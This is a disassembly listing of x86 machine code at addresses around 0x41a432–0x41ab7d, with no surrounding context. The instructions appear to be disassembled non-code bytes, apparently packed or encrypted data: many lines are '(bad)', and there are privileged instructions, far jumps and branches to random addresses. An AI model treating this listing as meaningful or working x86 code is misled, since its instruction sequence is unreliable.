  41a432:	ret    0xe3c1
  41a435:	mul    cl
  41a437:	adc    eax,0x11726e16
  41a43c:	mov    bl,0x71
  41a43e:	ret    0x3ad5
  41a441:	xlat   BYTE PTR ss:[ebx]
  41a443:	out    0xe1,al
  41a445:	div    DWORD PTR [eax-0x50]
  41a448:	pop    edi
  41a449:	inc    edi
  41a44a:	lods   eax,DWORD PTR ds:[esi]
  41a44b:	mov    ecx,0xa15b30d
  41a450:	mov    ?,WORD PTR [ecx]
  41a452:	shr    DWORD PTR [ecx],0x3d
  41a455:	imul   ebp,DWORD PTR [esi-0x45],0xffffff8a
  41a459:	sti    
  41a45a:	mul    bh
  41a45c:	jmp    0x3c1a99c6
  41a461:	cmovge esp,DWORD PTR [edx]
  41a464:	int3   
  41a465:	(bad)  
  41a467:	cmp    BYTE PTR [ebx+0x3150e419],al
  41a46d:	sub    BYTE PTR [ecx+0x785cd08e],dh
  41a473:	nop
  41a474:	test   BYTE PTR [ebx+0x447b747a],0xbb
  41a47b:	ror    DWORD PTR [ebx+edx*1],cl
  41a47e:	fld    TBYTE PTR fs:[ecx+0x2e]
  41a482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a483:	jno    0x41a4cc
  41a485:	std    
  41a486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a487:	sbb    edi,ecx
  41a489:	cmp    cl,BYTE PTR ds:[eax+0x4845f66a]
  41a490:	cli    
  41a491:	ja     0x41a457
  41a493:	push   ebx
  41a494:	mov    cl,0xfa
  41a496:	dec    ebp
  41a497:	pushf  
  41a498:	push   edi
  41a499:	rol    BYTE PTR [esi+0x65],0xba
  41a49d:	inc    edi
  41a49e:	je     0x41a499
  41a4a0:	inc    edi
  41a4a1:	or     BYTE PTR [ecx],cl
  41a4a3:	(bad)  
  41a4a4:	call   ecx
  41a4a6:	outs   dx,DWORD PTR ds:[esi]
  41a4a7:	rol    BYTE PTR ds:[eax+edx*1-0x3de11063],cl
  41a4af:	xor    dl,BYTE PTR [ecx+0xe]
  41a4b2:	adc    ebp,DWORD PTR [ecx-0x4b]
  41a4b5:	or     dh,BYTE PTR [ecx+0x3f799fcf]
  41a4bb:	ret    0xcb17
  41a4be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4bf:	ja     0x41a485
  41a4c1:	imul   BYTE PTR [esi+0x762937a3]
  41a4c7:	push   edi
  41a4c8:	dec    ebp
  41a4c9:	mov    edx,0x7656e2cd
  41a4ce:	sahf   
  41a4cf:	mov    esp,0x2b9faf8c
  41a4d4:	loope  0x41a4db
  41a4d6:	dec    ecx
  41a4d7:	fwait
  41a4d8:	loop   0x41a51b
  41a4da:	jge    0x41a522
  41a4dc:	add    eax,0x4d315a1f
  41a4e1:	add    esp,DWORD PTR [ecx+0x559a8d56]
  41a4e7:	push   cs
  41a4e8:	jne    0x41a4c1
  41a4ea:	push   esi
  41a4eb:	mov    eax,0x90ac8458
  41a4f0:	outs   dx,DWORD PTR ds:[esi]
  41a4f1:	aam    0xdf
  41a4f3:	inc    edi
  41a4f4:	test   al,0x66
  41a4f6:	pop    ebp
  41a4f7:	jo     0x41a576
  41a4f9:	mov    esi,0x76ddbd55
  41a4fe:	ds jle 0x41a578
  41a501:	stos   BYTE PTR es:[edi],al
  41a502:	jmp    0x41a569
  41a504:	sbb    DWORD PTR [esi],ecx
  41a506:	and    cl,dl
  41a508:	stc    
  41a509:	and    esp,ecx
  41a50b:	mov    al,0x46
  41a50d:	js     0x41a587
  41a50f:	mov    ch,0x51
  41a511:	xchg   ebp,eax
  41a512:	cmp    al,0xba
  41a514:	add    edx,DWORD PTR [eax+0x4c8b94c5]
  41a51a:	imul   esi,DWORD PTR [eax],0x4d
  41a51d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a51e:	sbb    eax,0x8da9a58c
  41a523:	pop    edx
  41a524:	dec    edx
  41a525:	or     ch,dh
  41a527:	fnstsw WORD PTR [edx+ebx*4-0x49]
  41a52b:	xor    ch,0x11
  41a52e:	mov    cl,0x11
  41a530:	inc    esp
  41a531:	add    eax,0x4438d011
  41a536:	and    al,0x67
  41a538:	fst    DWORD PTR [ebx-0x51abff02]
  41a53e:	or     eax,0x7f23c0b9
  41a543:	pop    esi
  41a544:	xchg   ebp,eax
  41a545:	sahf   
  41a546:	or     ebp,DWORD PTR [ebp-0x5c29d245]
  41a54c:	cmp    BYTE PTR [edx+0x68d5fb16],ah
  41a552:	fstp   QWORD PTR [ecx-0x6e47389c]
  41a558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a559:	lahf   
  41a55a:	test   DWORD PTR [esi-0x6e5724f7],ebp
  41a560:	dec    ebp
  41a561:	mov    ds:0x14a0c727,al
  41a566:	test   DWORD PTR [edx-0x2aacd404],esi
  41a56c:	aad    0x5c
  41a56e:	adc    ebx,esi
  41a570:	shr    bl,0x97
  41a573:	ss dec edi
  41a575:	shl    BYTE PTR [edx+0x58fc9c8c],cl
  41a57b:	scas   al,BYTE PTR es:[edi]
  41a57c:	pop    edx
  41a57d:	retf   
  41a57e:	add    al,0xda
  41a580:	aaa    
  41a581:	mov    WORD PTR [ecx],gs
  41a583:	leave  
  41a584:	add    ah,0x9c
  41a587:	mov    bl,0x65
  41a589:	push   esp
  41a58a:	jl     0x41a568
  41a58c:	inc    ecx
  41a58d:	jae    0x41a5d6
  41a58f:	enter  0xd36b,0x1f
  41a593:	xlat   BYTE PTR ds:[ebx]
  41a594:	add    al,al
  41a596:	call   DWORD PTR ds:0xbcfe3d9c
  41a59c:	pop    esi
  41a59d:	add    BYTE PTR [esi+0x8785580],dl
  41a5a3:	stc    
  41a5a4:	dec    esi
  41a5a5:	mov    esi,DWORD PTR [edi]
  41a5a7:	lahf   
  41a5a8:	hlt    
  41a5a9:	shl    BYTE PTR ds:0x3aea03f7,0x3d
  41a5b0:	aam    0x0
  41a5b2:	clc    
  41a5b3:	adc    ebp,DWORD PTR [esi+0xd]
  41a5b6:	sub    ecx,eax
  41a5b8:	mov    ebx,0x7c624fa1
  41a5bd:	cmc    
  41a5be:	mov    esi,DWORD PTR [ecx+eax*2]
  41a5c1:	sbb    DWORD PTR ds:0x6bd26902,eax
  41a5c7:	cmp    al,0xd
  41a5c9:	int    0x68
  41a5cb:	loopne 0x41a5e0
  41a5cd:	xor    dh,BYTE PTR [esi-0x55010261]
  41a5d3:	xchg   edi,edx
  41a5d5:	xchg   esp,eax
  41a5d6:	xchg   edx,eax
  41a5d7:	xor    DWORD PTR [edx+0x4],0x7f
  41a5db:	aad    0x75
  41a5dd:	and    eax,0x9d7db42
  41a5e2:	or     edx,DWORD PTR [edx]
  41a5e4:	xor    al,0xf8
  41a5e6:	sti    
  41a5e7:	push   0x7c63db06
  41a5ec:	xchg   BYTE PTR [ebp-0x66e75934],ch
  41a5f2:	mov    bh,0xf0
  41a5f4:	jecxz  0x41a5a2
  41a5f6:	pop    ss
  41a5f7:	call   0xda289c74
  41a5fc:	xchg   BYTE PTR [esi+esi*4+0x45],bh
  41a600:	adc    al,0xd5
  41a602:	jbe    0x41a61b
  41a604:	sahf   
  41a605:	push   edi
  41a606:	into   
  41a607:	rcr    eax,0xf7
  41a60a:	cli    
  41a60b:	jno    0x41a609
  41a60d:	pushf  
  41a60e:	push   edi
  41a60f:	cdq    
  41a610:	lock cmp bh,BYTE PTR [esi-0x4a]
  41a614:	(bad)  
  41a616:	data16 add bh,BYTE PTR [edi-0x518c03f2]
  41a61d:	ds dec edx
  41a61f:	cmp    dh,BYTE PTR [esi]
  41a621:	add    edi,0xfffffff4
  41a624:	mov    WORD PTR [esi],fs
  41a626:	sbb    BYTE PTR [eax],0x26
  41a629:	arpl   WORD PTR [esi+0x50],dx
  41a62c:	xchg   ebx,eax
  41a62d:	inc    esp
  41a62e:	add    ah,bh
  41a630:	imul   ebx,esi,0xafb28bb0
  41a636:	cmp    BYTE PTR [edi],dh
  41a638:	mov    esi,0x7ced4ec5
  41a63d:	sub    DWORD PTR [edx-0x58],eax
  41a640:	jp     0x41a5ec
  41a642:	das    
  41a643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a644:	sub    cl,BYTE PTR [edi]
  41a646:	or     BYTE PTR [eax+0x38],cl
  41a649:	mov    cl,0x50
  41a64b:	mov    WORD PTR [ebp-0x5],gs
  41a64e:	rcr    DWORD PTR [esi-0x66],1
  41a651:	adc    dh,BYTE PTR [ebp+0x55]
  41a654:	pop    edx
  41a655:	pop    ebx
  41a656:	lahf   
  41a657:	mov    ecx,0xf908e597
  41a65c:	sbb    ch,BYTE PTR [eax+ebx*8]
  41a65f:	inc    ecx
  41a660:	std    
  41a661:	push   edx
  41a662:	popa   
  41a663:	mov    DWORD PTR [ebp+0x4842162e],ebp
  41a669:	ins    BYTE PTR es:[edi],dx
  41a66a:	mov    ah,0xc1
  41a66c:	aas    
  41a66d:	pop    ecx
  41a66e:	rol    DWORD PTR [esi-0x6],1
  41a671:	xchg   esp,eax
  41a672:	add    al,0x16
  41a674:	scas   eax,DWORD PTR es:[edi]
  41a675:	mov    ch,0x30
  41a677:	nop
  41a678:	inc    esi
  41a679:	cs retf 
  41a67b:	pop    ss
  41a67c:	or     ebx,ebp
  41a67e:	adc    edi,eax
  41a680:	xchg   ebx,eax
  41a681:	push   edx
  41a683:	pusha  
  41a684:	shl    DWORD PTR [esi+0x27],cl
  41a687:	push   es
  41a688:	xor    DWORD PTR [esi-0x7c],ecx
  41a68b:	mov    ch,0xbd
  41a68d:	or     dl,BYTE PTR [edx+0x4dc47379]
  41a693:	mov    ah,0x75
  41a695:	ret    0x7c78
  41a698:	add    al,0x21
  41a69a:	popf   
  41a69b:	lock or al,0x59
  41a69e:	rol    BYTE PTR [esi-0x5c],0x86
  41a6a2:	(bad)  
  41a6a3:	std    
  41a6a4:	arpl   WORD PTR [esi-0x44],sp
  41a6a7:	pushf  
  41a6a8:	sub    ah,BYTE PTR [eax-0x67855851]
  41a6ae:	jbe    0x41a671
  41a6b0:	mov    ebp,0xdc082cb0
  41a6b5:	dec    ebp
  41a6b6:	xor    eax,0x8cd46b1c
  41a6bb:	aaa    
  41a6bc:	or     edi,DWORD PTR [esi+0x3f]
  41a6bf:	jae    0x41a70f
  41a6c1:	fwait
  41a6c2:	int3   
  41a6c3:	addr16 mov ds:0x687b,al
  41a6c7:	stos   DWORD PTR es:[edi],eax
  41a6c8:	cmp    eax,DWORD PTR [edx+eax*8+0x31b8bd5f]
  41a6cf:	sub    ch,BYTE PTR [ebp-0x42]
  41a6d2:	push   0x0
  41a6d4:	lods   eax,DWORD PTR ds:[esi]
  41a6d5:	fs cli 
  41a6d7:	out    dx,eax
  41a6d8:	jbe    0x41a674
  41a6da:	jle    0x41a6eb
  41a6dc:	cli    
  41a6dd:	out    0x98,eax
  41a6df:	fistp  QWORD PTR [edi+0x2d]
  41a6e2:	sub    eax,0x4cd506b2
  41a6e7:	jp     0x41a6d8
  41a6e9:	jnp    0x41a6bd
  41a6eb:	shl    BYTE PTR [esi-0x58],1
  41a6ee:	sahf   
  41a6ef:	adc    ebp,DWORD PTR [ecx+0x35]
  41a6f2:	jl     0x41a6e6
  41a6f4:	into   
  41a6f5:	call   0x9b77a4d6
  41a6fa:	inc    ecx
  41a6fb:	pop    edi
  41a6fc:	(bad)  
  41a6fd:	in     eax,0x5f
  41a6ff:	jmp    0x20bd:0x4ed9900b
  41a706:	dec    ecx
  41a707:	adc    DWORD PTR [ecx],0x39
  41a70a:	xchg   ebp,eax
  41a70b:	lods   eax,DWORD PTR ds:[esi]
  41a70c:	stos   DWORD PTR es:[edi],eax
  41a70d:	push   ebx
  41a70e:	in     al,dx
  41a70f:	cdq    
  41a710:	(bad)  
  41a711:	mov    ds:0x2f356ba5,al
  41a716:	sbb    BYTE PTR [edx],bl
  41a718:	jecxz  0x41a781
  41a71a:	xchg   ebx,edi
  41a71c:	jg     0x41a727
  41a71e:	ds adc eax,0xd068aadd
  41a724:	xchg   edi,eax
  41a725:	xchg   bx,ax
  41a727:	ficom  DWORD PTR [edx-0x25]
  41a72a:	ins    DWORD PTR es:[edi],dx
  41a72b:	loop   0x41a71f
  41a72d:	ret    
  41a72e:	xor    ecx,DWORD PTR [ecx+0x24e5eb3a]
  41a734:	fwait
  41a735:	iret   
  41a736:	add    dh,dl
  41a738:	in     eax,0x8f
  41a73a:	xchg   DWORD PTR [ebx],esi
  41a73c:	xchg   edi,eax
  41a73d:	dec    ecx
  41a73f:	inc    esp
  41a740:	cmc    
  41a741:	sar    BYTE PTR [ebp+0xd],cl
  41a744:	jle    0x41a6fe
  41a746:	xchg   esi,eax
  41a747:	fistp  DWORD PTR [ebp-0x2e5af161]
  41a74d:	pushf  
  41a74e:	hlt    
  41a74f:	inc    edi
  41a750:	jns    0x41a739
  41a752:	lahf   
  41a753:	lahf   
  41a754:	push   ebp
  41a755:	dec    esp
  41a756:	xor    DWORD PTR [ebx+ecx*8+0x5c305b1c],ebx
  41a75d:	test   eax,0xec07e935
  41a762:	jmp    0x86bb:0x8ed6a1a3
  41a769:	fdiv   st(7),st
  41a76b:	and    eax,0x6de0709a
  41a770:	daa    
  41a771:	in     eax,0x8f
  41a773:	sub    DWORD PTR [ebx-0x80],ebx
  41a776:	(bad)  {k3}
  41a77b:	inc    ebx
  41a77c:	loope  0x41a799
  41a77e:	mov    esi,0x14450bbb
  41a783:	mov    dh,0x40
  41a785:	pop    es
  41a786:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a787:	call   0xc087:0x5b5e0dbb
  41a78e:	lahf   
  41a78f:	cwde   
  41a790:	xchg   DWORD PTR ds:0xafce803d,ecx
  41a796:	icebp  
  41a797:	sbb    DWORD PTR [ecx-0x7468a9d4],ecx
  41a79d:	xchg   ebx,eax
  41a79e:	ret    0xea75
  41a7a1:	push   esi
  41a7a2:	jmp    0x41a7da
  41a7a4:	mov    esp,esp
  41a7a6:	add    eax,0xe1449dd4
  41a7ab:	lods   eax,DWORD PTR ds:[esi]
  41a7ac:	inc    eax
  41a7ad:	call   0xc739:0x83b85582
  41a7b4:	inc    ecx
  41a7b5:	into   
  41a7b6:	int    0x21
  41a7b8:	jne    0x41a7b7
  41a7ba:	cmp    si,WORD PTR [ecx]
  41a7bd:	jge    0x41a7d4
  41a7bf:	imul   edx,ebp,0x1f
  41a7c2:	shl    DWORD PTR [ebp+0x66],1
  41a7c5:	outs   dx,BYTE PTR ds:[esi]
  41a7c6:	xchg   ebx,eax
  41a7c7:	int3   
  41a7c8:	popa   
  41a7c9:	lods   eax,DWORD PTR ds:[esi]
  41a7ca:	inc    ebx
  41a7cb:	fsub   QWORD PTR [ebx-0x43]
  41a7ce:	or     DWORD PTR [eax+0x46892099],esp
  41a7d4:	or     ebx,DWORD PTR [edi]
  41a7d6:	pop    esi
  41a7d7:	cmp    BYTE PTR [ecx],bl
  41a7d9:	jl     0x41a83b
  41a7db:	imul   ebx
  41a7dd:	fistp  WORD PTR [esp+ecx*1+0x0]
  41a7e1:	mov    edi,0xf65e0ce5
  41a7e6:	sbb    al,0xf5
  41a7e8:	and    BYTE PTR [ebx],ah
  41a7ea:	push   ecx
  41a7eb:	mov    BYTE PTR [edx+0x40],ah
  41a7ee:	call   0x297d:0xf12b62d2
  41a7f5:	iret   
  41a7f6:	addr16 mov edx,0x90c8d9b2
  41a7fc:	lea    edx,[ebp+0x203d0c79]
  41a802:	hlt    
  41a803:	in     eax,dx
  41a804:	xchg   BYTE PTR [esi+0x18eee0cd],dl
  41a80a:	test   DWORD PTR [edx],eax
  41a80c:	loope  0x41a855
  41a80e:	xor    BYTE PTR [ebp+0x2],bl
  41a811:	xchg   esi,eax
  41a812:	add    BYTE PTR [esp+edi*1+0x5c8790be],dl
  41a819:	and    DWORD PTR [eax-0x1765cc95],edi
  41a81f:	test   BYTE PTR [esi-0x1643186a],0x73
  41a826:	jl     0x41a8a4
  41a828:	or     BYTE PTR [eax+0x5c0418ba],dl
  41a82e:	sbb    cl,cl
  41a830:	dec    ecx
  41a831:	mov    bl,0xf4
  41a833:	cdq    
  41a834:	lock mov dl,0x1d
  41a837:	ja     0x41a87c
  41a839:	mov    edi,DWORD PTR [edx-0x1c]
  41a83c:	ds stc 
  41a83e:	jmp    DWORD PTR [edi]
  41a840:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a841:	or     eax,0x81437d6d
  41a846:	hlt    
  41a847:	lahf   
  41a848:	cmp    ch,BYTE PTR [ebp-0x10]
  41a84b:	and    al,0x13
  41a84d:	fs mov bl,0x35
  41a850:	and    al,0x51
  41a852:	push   edx
  41a853:	jl     0x41a8a9
  41a855:	and    al,0x96
  41a857:	xor    BYTE PTR [ebx-0x54],bl
  41a85a:	fnsave [esi+0x242b51d9]
  41a860:	pop    edi
  41a861:	sub    BYTE PTR [ecx+ebx*4+0x1],dl
  41a865:	push   cs
  41a866:	loope  0x41a8a1
  41a868:	adc    dl,BYTE PTR [edi+0x24fc1d26]
  41a86e:	adc    BYTE PTR [ebx+0x33280bfd],bh
  41a874:	or     edx,DWORD PTR [edi+esi*4-0x1c]
  41a878:	inc    eax
  41a879:	add    eax,0xbbbe6b60
  41a87e:	cwde   
  41a87f:	das    
  41a880:	xchg   ecx,eax
  41a881:	and    eax,0x3e3274cf
  41a886:	lock aad 0xf4
  41a889:	jno    0x41a897
  41a88b:	pop    es
  41a88c:	adc    al,BYTE PTR [edi]
  41a88e:	mov    dl,ah
  41a890:	fnstcw WORD PTR [ebx-0x26]
  41a893:	test   ah,ah
  41a895:	push   ss
  41a896:	jae    0x41a856
  41a898:	pop    ebx
  41a899:	mov    dh,0x25
  41a89b:	rcl    BYTE PTR ds:[eax+ebx*4],1
  41a89f:	cmp    dh,BYTE PTR ds:0x895b9eed
  41a8a5:	ffree  st(3)
  41a8a7:	add    al,0x4d
  41a8a9:	mov    esp,0x1eb2750e
  41a8ae:	inc    eax
  41a8af:	repz xchg edx,eax
  41a8b1:	pop    esp
  41a8b2:	cmp    eax,DWORD PTR [ecx+edx*4]
  41a8b5:	xchg   ebp,eax
  41a8b6:	mov    BYTE PTR [esi],ch
  41a8b8:	pop    esi
  41a8b9:	mov    bl,0xd8
  41a8bb:	cmc    
  41a8bc:	jg     0x41a845
  41a8be:	daa    
  41a8bf:	addr16 inc esi
  41a8c1:	mov    eax,ds:0xc55f62b6
  41a8c6:	dec    esp
  41a8c7:	dec    ebp
  41a8c8:	std    
  41a8c9:	stos   DWORD PTR es:[edi],eax
  41a8ca:	(bad)  
  41a8cc:	push   es
  41a8cd:	js     0x41a8af
  41a8cf:	and    DWORD PTR [edi+0xf70ae81],edx
  41a8d5:	or     BYTE PTR [eax],ch
  41a8d7:	jmp    0x1f96a3
  41a8dc:	imul   ecx,ecx,0x57
  41a8df:	mov    ds:0xff98f1f4,eax
  41a8e4:	mov    esi,0xd3b53913
  41a8e9:	push   ebp
  41a8ea:	inc    esi
  41a8eb:	ret    0x728e
  41a8ee:	pop    ds
  41a8ef:	nop
  41a8f0:	(bad)  
  41a8f1:	pop    esp
  41a8f2:	aam    0x1b
  41a8f4:	or     al,0xe7
  41a8f6:	rcr    BYTE PTR [esi-0x11],0x9b
  41a8fa:	mov    esp,0xd15abd9a
  41a8ff:	fbstp  TBYTE PTR [ebx-0x74]
  41a902:	and    BYTE PTR [eax+ecx*8-0x70],dh
  41a906:	mov    bl,0xdc
  41a908:	pop    ebp
  41a909:	mov    BYTE PTR [ecx-0x7d],ch
  41a90c:	pop    ebx
  41a90d:	sbb    BYTE PTR [ecx],al
  41a90f:	push   ebp
  41a910:	adc    al,0xa2
  41a912:	ror    ah,0x5c
  41a915:	inc    esi
  41a916:	ss retfw 
  41a919:	popa   
  41a91a:	or     esp,DWORD PTR [ebp+0x37]
  41a91d:	mov    bh,0x3c
  41a91f:	cmp    esp,DWORD PTR [ebp-0x1306d5fe]
  41a925:	dec    edx
  41a926:	push   ebp
  41a927:	lahf   
  41a928:	dec    ebx
  41a929:	fistp  QWORD PTR [edx+0x76]
  41a92c:	xchg   esi,eax
  41a92d:	sahf   
  41a92e:	jmp    0xafced023
  41a933:	mov    ds:0xd81448c8,al
  41a938:	loope  0x41a8e4
  41a93a:	xor    ebp,DWORD PTR [ebx-0x69]
  41a93d:	test   al,0xa7
  41a93f:	jmp    0x71900cdc
  41a944:	sub    bl,BYTE PTR [edx+0x7579414e]
  41a94a:	outs   dx,BYTE PTR ds:[esi]
  41a94b:	pop    edx
  41a94c:	ss mov ebx,0x384665c5
  41a952:	adc    edi,DWORD PTR [edx+0x156b0c3f]
  41a958:	dec    esi
  41a959:	rcl    BYTE PTR [edi],cl
  41a95b:	xchg   DWORD PTR [ebx+0x72],esp
  41a95e:	mov    ah,0x78
  41a960:	mov    esi,0x7f0fa85c
  41a965:	data16 mov bl,0x31
  41a968:	push   ss
  41a969:	push   edi
  41a96a:	into   
  41a96b:	sar    DWORD PTR [eax+0x64],cl
  41a96e:	ins    BYTE PTR es:[edi],dx
  41a96f:	arpl   WORD PTR [ebx-0x383c3e97],sp
  41a975:	aaa    
  41a976:	cli    
  41a977:	ret    0x44c4
  41a97a:	or     ebp,esp
  41a97c:	fisub  WORD PTR [ebx+0x42a995af]
  41a982:	cwde   
  41a983:	test   eax,0x1365b844
  41a988:	dec    edi
  41a989:	je     0x41a9d1
  41a98b:	xor    bh,BYTE PTR [esi+0x16]
  41a98e:	fld    QWORD PTR [eax+eax*4+0x0]
  41a992:	rcr    ebx,0x55
  41a995:	popa   
  41a996:	adc    eax,0xbcd1b9ee
  41a99b:	jmp    0xb503:0x93242e9
  41a9a2:	inc    ebp
  41a9a3:	(bad)  
  41a9a4:	sbb    al,0xc9
  41a9a6:	retf   
  41a9a7:	mov    edx,0x57cc8d65
  41a9ac:	scas   al,BYTE PTR es:[edi]
  41a9ad:	pop    ebp
  41a9ae:	xchg   esp,eax
  41a9af:	push   edx
  41a9b0:	loope  0x41aa17
  41a9b2:	jp     0x41a99f
  41a9b4:	or     eax,eax
  41a9b6:	mov    bl,BYTE PTR fs:[esi+edx*4+0x48]
  41a9bb:	xchg   BYTE PTR [ebx],bh
  41a9bd:	lahf   
  41a9be:	mov    cl,0x58
  41a9c0:	or     esi,esi
  41a9c2:	jmp    0x6a3a0c17
  41a9c7:	mov    cl,0xe9
  41a9c9:	push   eax
  41a9ca:	mov    ds:0xd6b9fd52,al
  41a9cf:	xchg   esi,eax
  41a9d0:	sti    
  41a9d1:	scas   al,BYTE PTR es:[edi]
  41a9d2:	(bad)  
  41a9d3:	bnd ja 0x41a9a8
  41a9d6:	lods   al,BYTE PTR ds:[esi]
  41a9d7:	aaa    
  41a9d8:	inc    esi
  41a9d9:	xor    esp,DWORD PTR [ecx]
  41a9db:	or     DWORD PTR [esi-0x4d],esp
  41a9de:	ja     0x41a99d
  41a9e0:	fwait
  41a9e1:	cmp    ebx,edi
  41a9e3:	jecxz  0x41a96a
  41a9e5:	sub    DWORD PTR [edi+edx*4-0xc584ea],0x9
  41a9ed:	xchg   ebx,eax
  41a9ee:	lods   al,BYTE PTR ds:[esi]
  41a9ef:	push   0x10
  41a9f1:	aaa    
  41a9f2:	sti    
  41a9f3:	in     eax,dx
  41a9f4:	lds    esi,FWORD PTR ds:0x2fb019bb
  41a9fa:	sti    
  41a9fb:	jno    0x41a9f4
  41a9fd:	pop    es
  41a9fe:	xchg   ebx,esp
  41aa00:	std    
  41aa01:	popa   
  41aa02:	or     al,0xf
  41aa04:	xchg   esp,eax
  41aa05:	les    esp,FWORD PTR [ecx+edi*1]
  41aa08:	test   edi,esp
  41aa0a:	clc    
  41aa0b:	jp     0x41a98e
  41aa0d:	stos   DWORD PTR es:[edi],eax
  41aa0e:	pop    ebx
  41aa0f:	imul   esp,DWORD PTR [esi],0xe817fef7
  41aa15:	(bad)  
  41aa16:	xor    al,0xd3
  41aa18:	jmp    0x758a:0xf7022e3
  41aa1f:	cmp    al,0x54
  41aa21:	jo     0x41a9b4
  41aa23:	retf   0xc332
  41aa26:	push   es
  41aa27:	test   DWORD PTR [eax-0x2a],eax
  41aa2a:	jae    0x41aa56
  41aa2c:	mov    ds:0x7918f4d,eax
  41aa31:	imul   eax,DWORD PTR [edx+0x24],0xffffffcb
  41aa35:	shr    BYTE PTR [esi],cl
  41aa37:	mov    ah,0xe4
  41aa39:	pop    eax
  41aa3a:	mov    bh,0x6
  41aa3c:	mov    al,ds:0xa33b2dd2
  41aa41:	pop    edx
  41aa42:	push   eax
  41aa43:	scas   eax,DWORD PTR es:[edi]
  41aa44:	jecxz  0x41aaad
  41aa46:	inc    eax
  41aa47:	xchg   esi,eax
  41aa48:	xlat   BYTE PTR ds:[ebx]
  41aa49:	adc    BYTE PTR [ebp+0x3f7fb4cf],0xb3
  41aa50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa51:	rol    DWORD PTR [edi],0xa0
  41aa54:	fs test ah,bl
  41aa57:	jbe    0x41aa18
  41aa59:	int    0xce
  41aa5b:	int    0x5d
  41aa5d:	jae    0x41a9ed
  41aa5f:	add    eax,0xb677a5b6
  41aa64:	pop    fs
  41aa66:	dec    eax
  41aa67:	sti    
  41aa68:	add    ch,BYTE PTR [edi-0x197f3f4f]
  41aa6e:	mov    edx,0x95d4c9cc
  41aa73:	imul   edi,ebx,0xffffffe6
  41aa76:	mov    ebx,0xcaa512eb
  41aa7b:	or     ebp,DWORD PTR [edi-0xe]
  41aa7e:	fadd   QWORD PTR [ebx-0x7d57e820]
  41aa84:	push   edi
  41aa85:	and    bl,BYTE PTR [edi+0x73]
  41aa88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa89:	adc    eax,0xaeec097a
  41aa8e:	adc    ch,BYTE PTR [esi+0x3f]
  41aa91:	mov    ebp,0xb4235d89
  41aa96:	icebp  
  41aa97:	or     edi,DWORD PTR [edi]
  41aa99:	jmp    0x41aa3b
  41aa9b:	mov    edx,0xf6c139f2
  41aaa0:	mov    DWORD PTR [ebx],eax
  41aaa2:	dec    esi
  41aaa3:	mov    DWORD PTR [edx-0x23f92937],esp
  41aaa9:	inc    ecx
  41aaaa:	or     ah,BYTE PTR [eax-0x2c]
  41aaad:	add    eax,0x8f983066
  41aab2:	call   0x7bd2280f
  41aab7:	add    al,0x4
  41aab9:	test   eax,0xa1172dec
  41aabe:	out    0x86,al
  41aac0:	dec    eax
  41aac1:	sub    DWORD PTR [ebp+0x5a3663e0],eax
  41aac7:	call   0x185:0x582cef55
  41aace:	pop    esp
  41aacf:	sbb    ch,bh
  41aad1:	mov    ds:0x36f723b2,al
  41aad6:	jmp    0x41aa74
  41aad8:	cmp    al,0xf4
  41aada:	push   ebx
  41aadb:	dec    edi
  41aadc:	pop    eax
  41aadd:	sbb    BYTE PTR [esi-0x65255677],dh
  41aae3:	mov    ecx,0x32d49f9
  41aae8:	(bad)  
  41aae9:	shl    DWORD PTR [edx+edi*4+0xe],cl
  41aaed:	mov    ah,0x4a
  41aaef:	cmp    al,0xc0
  41aaf1:	push   0xffffffc4
  41aaf3:	aaa    
  41aaf4:	xchg   ebx,eax
  41aaf5:	pusha  
  41aaf6:	mov    esp,0x2ccaf547
  41aafb:	je     0x41ab43
  41aafd:	out    0x42,eax
  41aaff:	stos   BYTE PTR es:[edi],al
  41ab00:	(bad)  
  41ab01:	xor    BYTE PTR [edx],bh
  41ab03:	das    
  41ab04:	xchg   edx,eax
  41ab05:	adc    ch,BYTE PTR [ecx-0x7b]
  41ab08:	jnp    0x41ab80
  41ab0a:	mov    esp,0xba6cc31a
  41ab0f:	in     eax,dx
  41ab10:	cld    
  41ab11:	neg    BYTE PTR [ebx+edi*2]
  41ab14:	xchg   DWORD PTR [eax+ebx*2],eax
  41ab17:	cmp    ch,bh
  41ab19:	xchg   ebp,eax
  41ab1a:	jp     0x41aaef
  41ab1c:	mov    bl,0xcd
  41ab1e:	stos   DWORD PTR es:[edi],eax
  41ab1f:	aam    0xd8
  41ab21:	fdiv   DWORD PTR [ecx]
  41ab23:	or     edi,DWORD PTR [esi]
  41ab25:	neg    edx
  41ab27:	add    eax,0x6c8e7bc8
  41ab2c:	dec    edi
  41ab2d:	and    edi,DWORD PTR [edi+0x65]
  41ab30:	mov    DWORD PTR [edi-0x3b534ff6],ecx
  41ab36:	cwde   
  41ab37:	inc    ebx
  41ab38:	lods   eax,DWORD PTR ds:[esi]
  41ab39:	sub    ebx,DWORD PTR ds:0xdeb1a2ec
  41ab3f:	pop    ecx
  41ab40:	sbb    DWORD PTR [ebx-0x24833f7d],0x2
  41ab47:	and    al,0x72
  41ab49:	xor    ebp,DWORD PTR [edx]
  41ab4b:	fidivr DWORD PTR [eax+ebx*4]
  41ab4e:	pop    ecx
  41ab4f:	test   BYTE PTR [bx-0x63],dl
  41ab53:	rcl    BYTE PTR [edx+0x1c],0x38
  41ab57:	sbb    bl,ch
  41ab59:	inc    eax
  41ab5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab5b:	push   cs
  41ab5c:	pop    ebx
  41ab5d:	scas   eax,DWORD PTR es:[edi]
  41ab5e:	aaa    
  41ab5f:	scas   eax,DWORD PTR es:[edi]
  41ab60:	ret    0xa9bc
  41ab63:	sbb    eax,0x699661ef
  41ab68:	inc    esi
  41ab69:	or     BYTE PTR [edi-0x17b13ee6],cl
  41ab6f:	mov    cl,0x5f
  41ab71:	or     ebx,DWORD PTR [ebx]
  41ab73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab74:	sbb    BYTE PTR [esi-0x3a],bh
  41ab77:	mov    WORD PTR [ebx-0x49507fa5],ss
  41ab7d:	jle    0x41aba0
